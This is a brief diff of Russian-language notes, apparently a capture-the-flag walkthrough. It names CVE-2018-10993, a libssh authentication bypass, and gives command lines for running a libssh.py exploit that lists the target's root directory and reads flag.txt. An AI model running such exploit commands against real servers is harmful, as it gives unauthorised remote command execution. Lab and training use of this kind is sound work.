@@ -1,6 +1,9 @@
 сайт в гугле не будет открываться
 надо перейти в кали и там в firefox откроется 
-то что там мы получим гуглим и находим cve 
+то что там мы получим гуглим и находим CVE-2018-10993
 сохраняем python file 
 запускаем в терминале 
-python3 libssh.py {link} и тут чтото надо ввести я не знаю
+python3 libssh.py -p {:after_double_dot} -c 'cd/;  ls -al' {link}
+дальше 
+python3 libssh.py -p {:after_double_dot} -c 'cd/; cat flag.txt' {link}
+
